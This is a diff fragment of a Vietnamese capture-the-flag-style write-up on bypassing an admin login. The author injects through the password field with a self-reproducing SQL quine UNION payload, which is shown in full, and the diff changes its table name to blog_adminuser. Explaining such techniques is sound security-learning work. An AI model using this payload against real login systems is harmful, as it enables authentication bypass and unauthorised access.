@@ -11,7 +11,7 @@ Trong source backend thì mình tìm bug sqli, thực hiện chèn trực tiếp
 Nhưng do username fix cứng là admin nên không thể inject được, bắt buộc phải inject vào password. Sau khi query, thực hiện so sánh password của bản ghi đầu tiên với password nhập vào. Điều này khiến cho việc chèn nhưng payload như `' or '1'='1'` là không khả thi. Sau một hồi gg thì mình tìm được một trick có thể giúp cho phép trả về nội dung của câu lệnh truy vấn. [Document](https://stackoverflow.com/questions/4006189/quine-self-producing-sql-query/4006209#4006209)
 
 ```
-SELECT * FROM USERS WHERE username = 'admin' and password = '' union select 1, 'admin', (select replace(replace('" union select 1, "admin", (select replace(replace("$",char(34),char(39)),char(36),"$")) --',char(34),char(39)),char(36),'" union select 1, "admin", (select replace(replace("$",char(34),char(39)),char(36),"$")) --')) --
+SELECT * FROM blog_adminuser WHERE username = 'admin' and password = '' union select 1, 'admin', (select replace(replace('" union select 1, "admin", (select replace(replace("$",char(34),char(39)),char(36),"$")) --',char(34),char(39)),char(36),'" union select 1, "admin", (select replace(replace("$",char(34),char(39)),char(36),"$")) --')) --
 ```
 Giải thích qua  thì mình sẽ thực hiện lặp lại 2 lần câu lệnh truy vấn ở đầu và cuối (vị trí `$`).
 
